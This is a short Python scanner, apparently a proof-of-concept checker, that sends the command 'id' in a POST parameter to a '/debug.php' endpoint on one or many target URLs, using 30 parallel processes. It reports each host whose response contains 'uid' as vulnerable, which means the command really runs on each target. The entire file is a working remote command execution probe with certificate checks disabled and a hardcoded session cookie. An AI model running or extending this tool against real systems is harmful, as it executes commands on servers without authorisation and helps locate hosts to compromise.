import requests
from multiprocessing import Pool
import warnings
import argparse

warnings.filterwarnings("ignore")
headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.3',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'keep-alive',
    'Content-Length': '12',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie': 'PHPSESSID=n8n03vmefnnrejq35697pbivl6',
    'X-Requested-With': 'XMLHttpRequest'
}


def main():
    argparser = argparse.ArgumentParser("检测工具")
    argparser.add_argument("-u", "--url", dest="target", help="检测url")
    argparser.add_argument("-f", "--file", dest="file", help="批量检测")
    arg=argparser.parse_args()
    pool = Pool(processes=30)
    targets=[]
    if arg.target:
        check(arg.target)
    elif arg.file:
        try:
            with open(arg.file,"r",encoding="utf-8") as f:
                line = f.readlines()
                for line in line:
                    if "http" in line:
                        line = line.strip()
                        targets.append(line)
                    else:
                        line="http://"+line
                        targets.append(line)
        except Exception as e:
            print("[ERROR]")
        pool.map(check,targets)




def check(target):
    data="cmd=id"
    target=f"{target}/debug.php?_t=0.297317996068593"
    r=requests.post(target,headers=headers,data=data,verify=False,timeout=3)

    if r.status_code==200 and "uid" in r.text:
        print(f"存在漏洞{target}")
if __name__ == '__main__':
    main()